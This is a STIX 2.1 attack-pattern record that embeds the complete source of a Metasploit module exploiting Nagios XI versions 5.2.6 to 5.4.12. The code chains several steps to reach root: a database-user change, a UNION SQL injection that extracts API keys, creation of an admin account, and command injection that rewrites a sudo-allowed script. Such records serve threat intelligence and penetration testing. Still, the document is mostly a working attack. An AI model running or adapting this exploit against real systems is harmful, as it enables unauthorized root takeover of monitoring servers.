{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b3c2f33a-8cfb-4ecd-ba70-2778b87133bb",
    "created": "2024-08-14T17:02:18.047299Z",
    "modified": "2024-08-14T17:02:18.047304Z",
    "name": "Nagios XI Chained Remote Code Execution",
    "description": " This module exploits a few different vulnerabilities in Nagios XI 5.2.6-5.4.12 to gain remote root access. The steps are: 1. Issue a POST request to /nagiosql/admin/settings.php which sets the database user to root. 2. SQLi on /nagiosql/admin/helpedit.php allows us to enumerate API keys. 3. The API keys are then used to add an administrative user. 4. An authenticated session is established with the newly added user 5. Command Injection on /nagiosxi/backend/index.php allows us to execute the payload with nopasswd sudo giving us a root shell. 6. Remove the added admin user and reset the database user. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/nagios_xi_chained_rce_2_electric_boogaloo.rb",
            "external_id": "nagios_xi_chained_rce_2_electric_boogaloo.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-8733"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-8734"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-8735"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-8736"
        },
        {
            "source_name": "reference",
            "url": "http://blog.redactedsec.net/exploits/2018/04/26/nagios.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ManualRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Nagios XI Chained Remote Code Execution',\n      'Description'    => %q{\n        This module exploits a few different vulnerabilities in Nagios XI 5.2.6-5.4.12 to gain remote root access.\n        The steps are:\n          1. Issue a POST request to /nagiosql/admin/settings.php which sets the database user to root.\n          2. SQLi on /nagiosql/admin/helpedit.php allows us to enumerate API keys.\n          3. The API keys are then used to add an administrative user.\n          4. An authenticated session is established with the newly added user\n          5. Command Injection on /nagiosxi/backend/index.php allows us to execute the payload with nopasswd sudo,\n          giving us a root shell.\n          6. Remove the added admin user and reset the database user.\n      },\n      'Author'         =>\n        [\n          'Cale Smith',   # @0xC413\n          'Benny Husted', # @BennyHusted\n          'Jared Arave'   # @iotennui\n        ],\n      'License'        => MSF_LICENSE,\n      'Platform'       => 'linux',\n      'Arch'           => [ARCH_X86],\n      'CmdStagerFlavor' => ['printf'],\n      'Targets'        =>\n        [\n          [\n            'Nagios XI 5.2.6 <= 5.4.12',\n            upper_version: Rex::Version.new('5.4.12'),\n            lower_version: Rex::Version.new('5.2.6')\n          ]\n        ],\n      'References'     =>\n        [\n          ['EDB', '44560'],\n          ['CVE', '2018-8733'],\n          ['CVE', '2018-8734'],\n          ['CVE', '2018-8735'],\n          ['CVE', '2018-8736'],\n          ['URL', 'http://blog.redactedsec.net/exploits/2018/04/26/nagios.html']\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' => {\n         'WfsDelay' => 30\n      },\n      'DisclosureDate'  => '2018-04-17',\n      'DefaultTarget'   => 0))\n    register_options(\n      [\n        Opt::RPORT(80)\n      ])\n    deregister_options('SRVHOST', 'SRVPORT')\n  end\n\n  def check\n    vprint_status \"STEP 0: Get Nagios XI version string.\"\n    res = send_request_cgi!({\n      'method' => 'GET',\n      'uri'    => '/nagiosxi/'\n    })\n\n    if !res || !res.get_html_document\n      fail_with(Failure::Unknown, 'Could not check nagios version')\n    end\n\n    if (@version = res.get_html_document.at('//input[@name = \"version\"]/@value').text)\n      @version = Rex::Version.new(@version)\n      vprint_good(\"STEP 0: Found Nagios XI version: #{@version.to_s}\")\n      if @version < target[:lower_version]\n        vprint_bad('Try nagios_xi_chained for this version.')\n      elsif (@version <= target[:upper_version] && @version >= target[:lower_version])\n        return CheckCode::Appears\n      end\n    end\n    CheckCode::Safe\n  end\n\n  def set_db_user(usr, passwd)\n    step = usr == 'root' ? '1' : '6.1'\n    vprint_status \"STEP #{step}: Setting Nagios XI DB user to #{usr}.\"\n    res = send_request_cgi({\n      'uri' => '/nagiosql/admin/settings.php',\n      'method' => 'POST',\n      'ctype'  => 'application/x-www-form-urlencoded',\n      'encode_params' => true,\n      'vars_post'   => {\n        'txtRootPath'=>'nagiosql',\n        'txtBasePath'=>'/var/www/html/nagiosql/',\n        'selProtocol'=>'http',\n        'txtTempdir'=>'/tmp',\n        'selLanguage'=>'en_GB',\n        'txtEncoding'=>'utf-8',\n        'txtDBserver'=>'localhost',\n        'txtDBport'=>3306,\n        'txtDBname'=>'nagiosql',\n        'txtDBuser'=> usr,\n        'txtDBpass'=> passwd,\n        'txtLogoff'=>3600,\n        'txtLines'=>15,\n        'selSeldisable'=>1\n      }\n    })\n\n    if !res || res.code != 302\n      fail_with(Failure::UnexpectedReply,\"STEP #{step}: Unexpected response setting db user to root\")\n    end\n    vprint_status \"STEP #{step}: Received a 302 Response. That's good!\"\n  end\n\n  def get_api_keys\n    vprint_status 'STEP 2: Exploiting SQLi to extract user API keys.'\n\n    sqli_parm = @version < Rex::Version.new('5.3.0') ? 'backend_ticket' : 'api_key'\n    sqli_val = rand_text_alpha(rand(5) + 5)\n    res = send_request_cgi({\n      'uri' => '/nagiosql/admin/helpedit.php',\n      'method' => 'POST',\n      'ctype' => 'application/x-www-form-urlencoded',\n      'encode_params' => true,\n      'vars_post' => {\n        'selInfoKey1'=>\"#{sqli_val}'UNION SELECT CONCAT('START_API:',#{sqli_parm},':END_API') FROM nagiosxi.xi_users-- \",\n        'hidKey1'=>'common',\n        'selInfoKey2'=>'free_variables_name',\n        'hidKey2'=>'',\n        'selInfoVersion'=>'',\n        'hidVersion'=>'',\n        'taContent'=>'',\n        'modus'=>0\n      }\n    })\n\n    if !res || res.code != 302 || !res.body\n      fail_with(Failure::UnexpectedReply,'STEP 2: Unexpected response extracting api keys')\n    end\n\n    vprint_status 'STEP 2: Received a 302 Response. That\\'s good!'\n    parse_api_key(res.body)\n  end\n\n  def parse_api_key(res_body)\n    begin_positions = res_body.enum_for(:scan, /START_API:/).map { Regexp.last_match.end(0) }\n    end_positions = res_body.enum_for(:scan, /:END_API/).map { Regexp.last_match.begin(0) - 1 }\n    api_keys = []\n\n    begin_positions.each_with_index do|val, i|\n      key = res_body[val..end_positions[i]]\n      unless api_keys.include?(key)\n        api_keys << key\n      end\n    end\n\n    if api_keys.length < 1\n      fail_with(Failure::Unknown, 'Could not parse api keys')\n    end\n\n    vprint_status \"Found #{api_keys.length.to_s} unique api keys\"\n    api_keys.each do |key|\n      vprint_status key\n    end\n\n    api_keys\n  end\n\n  def add_admin(keys, username, password)\n    vprint_status 'STEP 3: Using API Keys to add an administrative user...'\n    keys.each do |key|\n      user_id = try_add_admin(key, username, password)\n\n      if (user_id.to_i > 0)\n        vprint_good \"Added user:#{username} password:#{password} userid:#{user_id}\"\n        return user_id.to_s, key\n      end\n    end\n    fail_with(Failure::Unknown, 'STEP 3: Failed to add a user.')\n  end\n\n  def try_add_admin(key, username, passwd)\n    vprint_status \"STEP 3: trying to add admin user with key #{key}\"\n    res = send_request_cgi({\n      'uri'=> \"/nagiosxi/api/v1/system/user\",\n      'method' => 'POST',\n      'ctype' => 'application/x-www-form-urlencoded',\n      'vars_get' => {\n        'apikey' => key,\n        'pretty' => 1\n      },\n      'vars_post' =>{\n        'username'   => username,\n        'password'   => passwd,\n        'name'       => rand_text_alpha(rand(5) + 5),\n        'email'      =>\"#{username}@localhost\",\n        'auth_level' =>'admin',\n        'force_pw_change' => 0\n      }\n    })\n\n    json = res.get_json_document\n    json['userid'] ? json['userid'].to_i : -1\n  end\n\n  def delete_admin(key, user_id)\n    res = send_request_cgi({\n      'uri'=> \"/nagiosxi/api/v1/system/user/#{user_id}\",\n      'method' => 'DELETE',\n      'ctype' => 'application/x-www-form-urlencoded',\n      'vars_get' => {\n        'apikey' => key\n      }\n    })\n\n    res.body && res.body.include?('was added successfully') ? username : false\n  end\n\n  def login(username, password)\n    vprint_status \"STEP 4.1: Authenticate as user #{username} with password #{password}\"\n    #4.1 Get nsp for login\n    vprint_status 'STEP 4.1: Get NSP and nagiosxi for login..'\n    res = send_request_cgi({\n      'uri' =>'/nagiosxi/login.php',\n      'method' => 'POST',\n      'ctype' => 'application/x-www-form-urlencoded'\n    })\n\n    if !res || !res.body\n      fail_with(Failure::Unknown, 'STEP 4.1: Could not get nsp string for login')\n    end\n\n    login_nsp = parse_nsp_str(res.body)\n    vprint_status \"STEP 4.1: login_nsp #{login_nsp} \"\n\n    login_nagiosxi = parse_nagiosxi(res)\n    vprint_status \"STEP 4.1: login_nagiosxi #{login_nagiosxi}\"\n\n    vprint_status 'STEP 4.2: Authenticating...'\n    res = send_request_cgi({\n      'uri'=> '/nagiosxi/login.php',\n      'ctype' => 'application/x-www-form-urlencoded',\n      'method' => 'POST',\n      'cookie' => \"nagiosxi=#{login_nagiosxi};\",\n      'vars_post'=> {\n        'nsp' => login_nsp,\n        'page' => 'auth',\n        'debug' => '',\n        'pageopt' => 'login',\n        'username' => username,\n        'password' => password,\n        'loginButton' => ''\n      }\n    })\n\n    if !res || res.code != 302\n      fail_with(Failure::Unknown, 'STEP 4.2 Could not get authed nsp string.')\n    end\n\n    authed_nagiosxi = parse_nagiosxi(res)\n    vprint_status \"STEP 4.2: authed_nagiosxi #{authed_nagiosxi}\"\n    authed_nagiosxi\n  end\n\n  def parse_nsp_str(resp_body)\n    nsp_strs = /var nsp_str = \"(.+)\";\\n/.match(resp_body)\n\n    unless nsp_strs || nsp_strs.length < 2\n      fail_with(Failure::NotFound, 'Could not find nsp_str')\n    end\n\n    nsp_strs[1]\n  end\n\n  def parse_nagiosxi(res)\n    cookie = res.get_cookies\n    matches = /.*nagiosxi=(.+);/.match(cookie)\n\n    unless matches || matches.length < 2\n      fail_with(Failure::NotFound, 'Could not find nagiosxi cookie')\n    end\n\n    matches[1]\n  end\n\n  def execute_command(cmd, opts = {})\n    backup_file = rand_text_alpha(rand(5) + 10)\n\n    cmd_execution = \"$(cp /usr/local/nagiosxi/scripts/reset_config_perms.sh /usr/local/nagiosxi/scripts/#{backup_file} ; echo \\\"#{cmd}\\\" > /usr/local/nagiosxi/scripts/reset_config_perms.sh ; sudo /usr/local/nagiosxi/scripts/reset_config_perms.sh) &\"\n\n    cmd_cleanup = \"$(mv /usr/local/nagiosxi/scripts/#{backup_file} /usr/local/nagiosxi/scripts/reset_config_perms.sh)\"\n    opts_exec = {\n      'uri'=> '/nagiosxi/backend/index.php',\n      'method' => 'POST',\n      'ctype' => 'application/x-www-form-urlencoded',\n      'cookie' => \"nagiosxi=#{@nagiosxi}\",\n      'vars_get' => {\n        'cmd'=>'submitcommand',\n        'command'=>'1111',\n        'command_data'=> cmd_execution\n      }\n    }\n\n    opts_cleanup = {\n      'uri'=> '/nagiosxi/backend/index.php',\n      'method' => 'POST',\n      'ctype' => 'application/x-www-form-urlencoded',\n      'cookie' => \"nagiosxi=#{@nagiosxi}\",\n      'vars_get' => {\n        'cmd'=>'submitcommand',\n        'command'=>'1111',\n        'command_data'=> cmd_cleanup\n      }\n    }\n\n    vprint_status 'STEP 5.1: executing payload'\n    res = send_request_cgi(opts_exec)\n\n    if !res || res.code != 200\n      fail_with(Failure::Unknown, 'STEP 5.1: Command execution failed')\n    end\n\n    vprint_status 'STEP 5.2: removing scripts from disc'\n    res = send_request_cgi(opts_cleanup)\n\n    if !res || res.code != 200\n      fail_with(Failure::Unknown, 'STEP 5.2: Command cleanup failed')\n    end\n  end\n\n  def exploit\n    if check != CheckCode::Appears\n      fail_with(Failure::NotVulnerable, 'STEP 0: Vulnerable version not found! punt!')\n    end\n\n    set_db_user('root', 'nagiosxi')\n\n    keys = get_api_keys\n    username = rand_text_alpha(rand(6) + 10)\n    password = rand_text_alpha(rand(6) + 10)\n\n    user_id, key = add_admin(keys, username, password)\n    @nagiosxi = login(username, password)\n    execute_cmdstager()\n\n    #revert databaseuser\n    set_db_user('nagiosql', 'n@gweb')\n    vprint_status 'STEP 6.2: deleting admin'\n    delete_admin(key, user_id)\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-04-17",
    "x_mitre_platforms": [
        "linux'"
    ]
}